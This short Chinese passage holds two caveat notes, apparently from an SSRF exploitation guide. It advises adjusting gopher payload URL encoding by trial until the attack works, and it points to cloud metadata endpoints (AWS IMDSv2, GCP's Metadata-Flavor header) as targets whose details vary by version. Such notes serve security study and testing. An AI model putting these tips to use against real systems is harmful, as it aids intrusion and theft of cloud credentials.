- gopher payload 是否需要"二次 URL 编码"取决于后端处理链路(经过几层 `curl`/框架解码),没有统一答案,实战以打通为准,打不通就增减一次编码试。
- 各云厂商元数据服务的具体路径/是否要求请求头会随版本变化;AWS IMDSv2、GCP 的 `Metadata-Flavor: Google` 等细节以各厂商官方英文文档为准。
